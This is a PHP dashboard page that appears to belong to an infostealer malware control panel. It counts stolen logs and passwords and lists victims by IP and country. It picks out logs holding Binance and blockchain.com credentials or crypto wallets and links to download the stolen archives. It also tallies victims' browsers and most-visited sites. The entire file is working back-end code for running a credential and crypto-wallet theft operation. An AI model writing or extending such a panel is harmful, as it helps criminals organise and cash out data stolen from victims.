<?php
include("./header.php");



?>

<!-- Page Content-->
<div class="page-content">
    <div class="container-fluid">
        <!-- Page-Title -->
        <div class="row">
            <div class="col-sm-12">
                <div class="page-title-box">
                    <div class="row">
                        <div class="col">
                            <h4 class="page-title">Dashboard</h4>
                            <ol class="breadcrumb">
                                <li class="breadcrumb-item">Analytics</li>
                            </ol>
                        </div>
                    </div>
                    <!--end row-->
                </div>
                <!--end page-title-box-->
            </div>
            <!--end col-->
        </div>
        <!--end row-->
        <!-- end page title end breadcrumb -->
        <div class="row">
            <div class="col-lg-9">
                <div class="row justify-content-center">
                    <div class="col-md-6 col-lg-3">
                        <div class="card report-card">
                            <div class="card-body">
                                <div class="row d-flex justify-content-center">
                                    <div class="col">
                                        <p class="text-dark mb-0 font-weight-semibold">Total log</p>
                                        <h3 class="m-0"><?php
                                                        include_once "../db.php";
                                                        echo R::count("log");
                                                        ?></h3>
                                        <p class="mb-0 text-truncate text-muted">During all this time</p>
                                    </div>
                                    <div class="col-auto align-self-center">
                                        <div class="report-main-icon bg-light-alt">
                                            <svg xmlns="width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-users">
                                                <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
                                                <circle cx="9" cy="7" r="4" />
                                                <path d="M23 21v-2a4 4 0 0 0-3-3.87" />
                                                <path d="M16 3.13a4 4 0 0 1 0 7.75" />
                                            </svg>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!--end card-body-->
                        </div>
                        <!--end card-->
                    </div>
                    <!--end col-->
                    <div class="col-md-6 col-lg-3">
                        <div class="card report-card">
                            <div class="card-body">
                                <div class="row d-flex justify-content-center">
                                    <div class="col">
                                        <p class="text-dark mb-0 font-weight-semibold">Last week</p>
                                        <h3 class="m-0">
                                            <?php
                                            $currentDate = new DateTime(date("Y-m-d"));
                                            $currentDate->modify("-7 day");
                                            $countCurrentWeek = R::count("log", "add_date > ?", [date_format($currentDate, "Y-m-d")]);
                                            echo $countCurrentWeek;
                                            $range1 = new DateTime(date("Y-m-d"));
                                            $range2 = new DateTime(date("Y-m-d"));
                                            $range1->modify("-7 day");
                                            $range2->modify("-14 day");
                                            $countLastWeek = R::count("log", "add_date BETWEEN :date1 AND :date2", [":date1" => date_format($range2, "Y-m-d"), ":date2" => date_format($range1, "Y-m-d")]);
                                            $icon = 'text-success';
                                            if ($countCurrentWeek - $countLastWeek < 0) {
                                                $icon = 'text-danger';
                                            }
                                            ?>
                                        </h3>
                                        <p class="mb-0 text-truncate text-muted"><span class="<?php echo $icon ?>">
                                                <svg viewBox="0 0 24 24" width="12" height="12" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="css-i6dzq1">
                                                    <line x1="7" y1="7" x2="17" y2="17"></line>
                                                    <polyline points="17 7 17 17 7 17"></polyline>
                                                </svg>
                                                <?php
                                                echo $countCurrentWeek - $countLastWeek;
                                                ?>
                                            </span> Than the
                                            previous
                                        </p>
                                    </div>
                                    <div class="col-auto align-self-center">
                                        <div class="report-main-icon bg-light-alt">
                                            <svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="css-i6dzq1">
                                                <circle cx="12" cy="12" r="10"></circle>
                                                <polyline points="12 6 12 12 16 14"></polyline>
                                            </svg>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!--end card-body-->
                        </div>
                        <!--end card-->
                    </div>
                    <!--end col-->
                    <div class="col-md-6 col-lg-3">
                        <div class="card report-card">
                            <div class="card-body">
                                <div class="row d-flex justify-content-center">
                                    <div class="col">
                                        <p class="text-dark mb-0 font-weight-semibold">Last 30d</p>
                                        <h3 class="m-0">
                                            <?php
                                            $currentDate = new DateTime(date("Y-m-d"));
                                            $currentDate->modify("-1 month");
                                            $countCurrentMonth = R::count("log", "add_date > ?", [date_format($currentDate, "Y-m-d")]);
                                            echo $countCurrentMonth;
                                            $range1 = new DateTime(date("Y-m-d"));
                                            $range2 = new DateTime(date("Y-m-d"));
                                            $range1->modify("-1 month");
                                            $range2->modify("-2 month");
                                            $countLastMonth = R::count("log", "add_date BETWEEN :date1 AND :date2", [":date1" => date_format($range2, "Y-m-d"), ":date2" => date_format($range1, "Y-m-d")]);
                                            if ($countCurrentMonth - $countLastMonth < 0) {
                                                $icon = 'text-danger';
                                            }
                                            ?>
                                        </h3>
                                        <p class="mb-0 text-truncate text-muted"><span class="<?php echo $icon ?>">
                                                <svg viewBox="0 0 24 24" width="12" height="12" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="css-i6dzq1">
                                                    <line x1="7" y1="7" x2="17" y2="17"></line>
                                                    <polyline points="17 7 17 17 7 17"></polyline>
                                                </svg>
                                                <?php
                                                echo $countCurrentMonth - $countLastMonth;
                                                ?>
                                            </span> Than the
                                            previous
                                        </p>
                                    </div>
                                    <div class="col-auto align-self-center">
                                        <div class="report-main-icon bg-light-alt">
                                            <svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="css-i6dzq1">
                                                <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline>
                                            </svg>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!--end card-body-->
                        </div>
                        <!--end card-->
                    </div>
                    <!--end col-->
                    <div class="col-md-6 col-lg-3">
                        <div class="card report-card">
                            <div class="card-body">
                                <div class="row d-flex justify-content-center">
                                    <div class="col">
                                        <p class="text-dark mb-0 font-weight-semibold">Total pass</p>
                                        <h3 class="m-0">
                                            <?php
                                            $count = R::getRow('SELECT SUM(count_pwds) FROM log');
                                            echo ($count["SUM(count_pwds)"]);
                                            ?>
                                        </h3>
                                        <p class="mb-0 text-truncate text-muted">
                                            During all this time</p>
                                    </div>
                                    <div class="col-auto align-self-center">
                                        <div class="report-main-icon bg-light-alt">
                                            <svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="css-i6dzq1">
                                                <rect x="2" y="7" width="20" height="14" rx="2" ry="2"></rect>
                                                <path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"></path>
                                            </svg>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!--end card-body-->
                        </div>
                        <!--end card-->
                    </div>
                    <!--end col-->
                </div>
                <!--end row-->
                <div class="card">
                    <div class="card-header">
                        <div class="row align-items-center">
                            <div class="col">
                                <h4 class="card-title">Chronology Overview</h4>
                            </div>
                        </div>
                        <!--end row-->
                    </div>
                    <!--end card-header-->
                    <div class="card-body">
                        <div class="">
                            <div id="ana_dash_1" class="apex-charts"></div>
                        </div>
                    </div>
                    <!--end card-body-->
                </div>
                <!--end card-->
            </div>
            <!--end col-->
            <div class="col-lg-3">
                <div class="card">
                    <div class="card-header">
                        <div class="row align-items-center">
                            <div class="col">
                                <h4 class="card-title">Сountry logs</h4>
                            </div>
                        </div>
                        <!--end row-->
                    </div>
                    <!--end card-header-->
                    <div class="card-body">
                        <div class="text-center">
                            <div id="ana_device" class="apex-charts"></div>

                        </div>
                        <div class="table-responsive mt-2">
                            <table class="table border-dashed mb-0">
                                <thead>
                                    <tr>
                                        <th>Сountry</th>
                                        <th class="text-right">Code</th>
                                        <th class="text-right">Logs</th>

                                    </tr>
                                </thead>
                                <tbody>
                                    <?php
                                    $countries = R::findAll('statistics_countries', ' ORDER BY count_c DESC LIMIT 5 ');

                                    foreach ($countries as $country) {
                                        echo '<tr>
												<td>' . $country["name"] . '</td>
												<td class="text-right">' . $country["code"] . '</td>
												<td class="text-right">' . $country['count_c'] . '</td>
											</tr>';
                                    }

                                    ?>


                                </tbody>
                            </table>
                            <!--end /table-->
                        </div>
                        <!--end /div-->
                    </div>
                    <!--end card-body-->
                </div>
                <!--end card-->
            </div>
            <!--end col-->
        </div>
        <!--end row-->

        <div class="row">

            <div class="col-lg-4">
                <div class="card">
                    <div class="card-header">
                        <div class="row align-items-center">
                            <div class="col">
                                <h4 class="card-title">Binance</h4>
                            </div>
                        </div>
                        <!--end row-->
                    </div>
                    <!--end card-header-->
                    <div class="card-body">
                        <div class="analytic-dash-activity" data-simplebar>
                            <div class="activity">
                                <?php
                                $logs = R::find('log', ' text_pwds LIKE ? ', ['%binance.com%']);
                                foreach ($logs as $log) {
                                    echo '<div class="activity-info">
                                    <div class="icon-info-activity">
                                        <img src="assets/images/small/binance.svg" height="30" class="pl-1 align-self-center rounded" alt="...">
                                    </div>
                                    <div class="activity-info-text">
                                        <div class="d-flex justify-content-between align-items-center">
                                            <div class="media-body align-self-center">
                                                <h6 class="m-0">' . $log["ip"] . ' country: ' . $log["country"] . '</h6>
                                                <p class="mb-0 text-muted">';



                                    echo ' 	
                                                </p>
                                                <small class="text-muted">';
                                    $now_date = new Datetime(date("Y-m-d H:i:s"));
                                    $old_date = new DateTime($log["add_date"]);
                                    $interval = $now_date->diff($old_date);
                                    echo $interval->format("%d days ago");
                                    echo '</small>
                                            </div>
                                            <div class="align-self-center">
                                                <textarea class="form-control" rows="1" style="margin-top: 0px; margin-bottom: 0px;">' . $log["note"] . '</textarea>
                                            </div>
                                            <div class="align-self-center">                                            
                                                <button id="'.$log["id"].'" class="btn_saveNote btn btn-outline-success btn-sm" type="button">
													<svg  width="24" height="24" 
														viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
														stroke-linecap="round" stroke-linejoin="round" class="feather feather-save" 
														style="width:20px;">
															<path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"></path>
															<polyline points="17 21 17 13 7 13 7 21"></polyline>
															<polyline points="7 3 7 8 15 8"></polyline>
													</svg>
												</button>
                                                <a href="' . $GLOBALS['logspath'] . '/' . $log["path"] . '" class="btn btn-outline-info btn-sm" type="button">
                                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
                                                        viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" 
                                                        stroke-linecap="round" stroke-linejoin="round" class="feather feather-download"
                                                        style="width:20px;">
                                                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                                                            <polyline points="7 10 12 15 17 10"/>
                                                            <line x1="12" y1="15" x2="12" y2="3"/>
                                                    </svg>
                                                </a>                                        
                                            </div>
                                        </div>
                                    </div>
                                </div> ';
                                }

                                ?>



                            </div>
                            <!--end activity-->
                        </div>
                        <!--end analytics-dash-activity-->
                    </div>
                    <!--end card-body-->
                </div>
                <!--end card-->
            </div>
            <!--end col-->


            <div class="col-lg-4">
                <div class="card">
                    <div class="card-header">
                        <div class="row align-items-center">
                            <div class="col">
                                <h4 class="card-title">Blockchain</h4>
                            </div>
                        </div>
                        <!--end row-->
                    </div>
                    <!--end card-header-->
                    <div class="card-body">
                        <div class="analytic-dash-activity" data-simplebar>
                            <div class="activity">
                                <?php
                                $logs = R::find('log', ' text_pwds LIKE ? ', ['%blockchain.com%']);
                                foreach ($logs as $log) {
                                    echo '<div class="activity-info">
                                    <div class="icon-info-activity">
                                        <img src="assets/images/small/blockchain.svg" height="30" class="pl-1 align-self-center rounded" alt="...">
                                    </div>
                                    <div class="activity-info-text">
                                        <div class="d-flex justify-content-between align-items-center">
                                            <div class="media-body align-self-center">
                                                <h6 class="m-0">' . $log["ip"] . ' country: ' . $log["country"] . '</h6>
                                                <p class="mb-0 text-muted">';
                                    

                                    echo ' 	
                                                </p>
                                                <small class="text-muted">';
                                    $now_date = new Datetime(date("Y-m-d H:i:s"));
                                    $old_date = new DateTime($log["add_date"]);
                                    $interval = $now_date->diff($old_date);
                                    echo $interval->format("%d days ago");
                                    echo '</small>
                                            </div>
                                            <div class="align-self-center">
                                                <textarea class="form-control" rows="1" style="margin-top: 0px; margin-bottom: 0px;">' . $log["note"] . '</textarea>
                                            </div>
                                            <div class="align-self-center">                                            
                                                <button id="'.$log["id"].'" class="btn_saveNote btn btn-outline-success btn-sm" type="button">
													<svg  width="24" height="24" 
														viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
														stroke-linecap="round" stroke-linejoin="round" class="feather feather-save" 
														style="width:20px;">
															<path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"></path>
															<polyline points="17 21 17 13 7 13 7 21"></polyline>
															<polyline points="7 3 7 8 15 8"></polyline>
													</svg>
												</button>
                                                <a href="' . $GLOBALS['logspath'] . '/' . $log["path"] . '" class="btn btn-outline-info btn-sm" type="button">
                                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
                                                        viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" 
                                                        stroke-linecap="round" stroke-linejoin="round" class="feather feather-download"
                                                        style="width:20px;">
                                                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                                                            <polyline points="7 10 12 15 17 10"/>
                                                            <line x1="12" y1="15" x2="12" y2="3"/>
                                                    </svg>
                                                </a>                                        
                                            </div>
                                        </div>
                                    </div>
                                </div> ';
                                }

                                ?>



                            </div>
                            <!--end activity-->
                        </div>
                        <!--end analytics-dash-activity-->
                    </div>
                    <!--end card-body-->
                </div>
                <!--end card-->
            </div>
            <!--end col-->

            <div class="col-lg-4">
                <div class="card">
                    <div class="card-header">
                        <div class="row align-items-center">
                            <div class="col">
                                <h4 class="card-title">Crypto</h4>
                            </div>
                        </div>
                        <!--end row-->
                    </div>
                    <!--end card-header-->
                    <div class="card-body">
                        <div class="analytic-dash-activity" data-simplebar>
                            <div class="activity">
                                <?php
                                $logs = R::find('log', ' count_crpt > ? ', [0]);
                                foreach ($logs as $log) {
                                    echo '<div class="activity-info">
                                    <div class="icon-info-activity">
                                        <img src="assets/images/small/btc.svg" height="30" class="pl-1 align-self-center rounded" alt="...">
                                    </div>
                                    <div class="activity-info-text">
                                        <div class="d-flex justify-content-between align-items-center">
                                            <div class="media-body align-self-center">
                                                <h6 class="m-0">' . $log["ip"] . ' country: ' . $log["country"] . '</h6>
                                                <p class="mb-0 text-muted">';
                                    
                                    

                                    echo ' 	
                                                </p>
                                                <small class="text-muted">';
                                    $now_date = new Datetime(date("Y-m-d H:i:s"));
                                    $old_date = new DateTime($log["add_date"]);
                                    $interval = $now_date->diff($old_date);
                                    echo $interval->format("%d days ago");
                                    echo '</small>
                                            </div>
                                            <div class="align-self-center field">
                                                <textarea class="form-control" rows="1" style="margin-top: 0px; margin-bottom: 0px;">' . $log["note"] . '</textarea>
                                            </div>
                                            <div class="align-self-center">                                            
                                                <button id="'.$log["id"].'" class="btn_saveNote btn btn-outline-success btn-sm" type="button">
													<svg  width="24" height="24" 
														viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
														stroke-linecap="round" stroke-linejoin="round" class="feather feather-save" 
														style="width:20px;">
															<path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"></path>
															<polyline points="17 21 17 13 7 13 7 21"></polyline>
															<polyline points="7 3 7 8 15 8"></polyline>
													</svg>
												</button>
                                                <a href="' . $GLOBALS['logspath'] . '/' . $log["path"] . '" class="btn btn-outline-info btn-sm" type="button">
                                                    <svg xmlns= width="24" height="24" 
                                                        viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" 
                                                        stroke-linecap="round" stroke-linejoin="round" class="feather feather-download"
                                                        style="width:20px;">
                                                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                                                            <polyline points="7 10 12 15 17 10"/>
                                                            <line x1="12" y1="15" x2="12" y2="3"/>
                                                    </svg>
                                                </a>                                        
                                            </div>
                                        </div>
                                    </div>
                                </div> ';
                                }

                                ?>


                            </div>
                            <!--end activity-->
                        </div>
                        <!--end analytics-dash-activity-->
                    </div>
                    <!--end card-body-->
                </div>
                <!--end card-->
            </div>
            <!--end col-->

        </div>
        <!--end row-->
        <div class="row">
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <div class="row align-items-center">
                            <div class="col">
                                <h4 class="card-title">Website Traffic</h4>
                            </div>
                            <!--end col-->
                        </div>
                        <!--end row-->
                    </div>
                    <!--end card-header-->
                    <div class="card-body">
                        <div class="table-responsive browser_users">
                            <table class="table mb-0">
                                <thead class="thead-light">
                                    <tr>
                                        <th class="border-top-0">Site</th>
                                        <th class="border-top-0">Count</th>
                                    </tr>
                                    <!--end tr-->
                                </thead>
                                <tbody>
                                    <?php
                                    $sites = R::findAll('topsites', ' ORDER BY count_r DESC LIMIT 5 ');
                                    foreach ($sites as $site) {
                                        echo '<tr>
												<td><a href="http://' . $site["url"] . '" class="text-primary">' . $site["url"] . '</a></td>

											<td>
												' . $site["count_r"] . '
											</td>
                                    </tr>';
                                    }
                                    ?>

                                </tbody>
                            </table>
                            <!--end table-->
                        </div>
                        <!--end /div-->
                    </div>
                    <!--end card-body-->
                </div>
                <!--end card-->
            </div>
            <!--end col-->

            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <div class="row align-items-center">
                            <div class="col">
                                <h4 class="card-title">Browser Used</h4>
                            </div>
                            <!--end col-->
                        </div>
                        <!--end row-->
                    </div>
                    <!--end card-header-->
                    <div class="card-body">
                        <div class="table-responsive browser_users">
                            <table class="table mb-0">
                                <thead class="thead-light">
                                    <tr>
                                        <th class="border-top-0">Browser</th>

                                        <th class="border-top-0">Count</th>
                                    </tr>
                                    <!--end tr-->
                                </thead>
                                <tbody>
                                    <tr>

                                        <td><img src="assets/images/browser_logo/chrome.png" alt="" height="16" class="mr-2">Chrome</td>

                                        <td><?php
                                            $browser = R::findOne('browsers', 'name = ?', ['Chromium']);
                                            echo $browser["count_c"];
                                            ?></td>
                                    </tr>
                                    <!--end tr-->
                                    <tr>
                                        <td><img src="assets/images/browser_logo/micro-edge.png" alt="" height="16" class="mr-2">Microsoft Edge</td>

                                        <td><?php
                                            $browser = R::findOne('browsers', 'name = ?', ['Edge']);
                                            echo $browser["count_c"];
                                            ?></td>
                                    </tr>
                                    <!--end tr-->
                                    <tr>
                                        <td><img src="assets/images/browser_logo/in-explorer.png" alt="" height="16" class="mr-2">Internet-Explorer</td>

                                        <td><?php
                                            $browser = R::findOne('browsers', 'name = ?', ['IE']);
                                            echo $browser["count_c"];
                                            ?></td>
                                    </tr>
                                    <!--end tr-->
                                    <tr>
                                        <td><img src="assets/images/browser_logo/opera.png" alt="" height="16" class="mr-2">Opera</td>

                                        <td><?php
                                            $browser = R::findOne('browsers', 'name = ?', ['Opera']);
                                            echo $browser["count_c"];
                                            ?></td>
                                    </tr>
                                    <!--end tr-->
                                    <tr>
                                        <td><img src="assets/images/browser_logo/firefox.png" alt="" height="16" class="mr-2">Mozilla Firefox</td>

                                        <td><?php
                                            $browser = R::findOne('browsers', 'name = ?', ['Firefox']);
                                            echo $browser["count_c"];
                                            ?></td>
                                    </tr>
                                    <!--end tr-->

                                </tbody>
                            </table>
                            <!--end table-->
                        </div>
                        <!--end /div-->
                    </div>
                    <!--end card-body-->
                </div>
                <!--end card-->
            </div>
            <!--end col-->
        </div>
        <!--end row-->

        <?php
        include("./footer.php");



        ?>
    </div><!-- container -->


    <!--end footer-->
</div>
<!-- end page content -->
</div>
<!-- end page-wrapper -->




<!-- jQuery  -->
<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.bundle.min.js"></script>
<script src="assets/js/metismenu.min.js"></script>
<script src="assets/js/waves.js"></script>
<script src="assets/js/feather.min.js"></script>
<script src="assets/js/simplebar.min.js"></script>
<script src="assets/js/moment.js"></script>
<script src="includes/dashboardactions.js"></script>
<script src="assets/js/apexcharts.min.js"></script>
<script src="assets/js/jquery.analytics_dashboard.init.js"></script>

<!-- App js -->
<script src="assets/js/app.js"></script>

</body>



</html>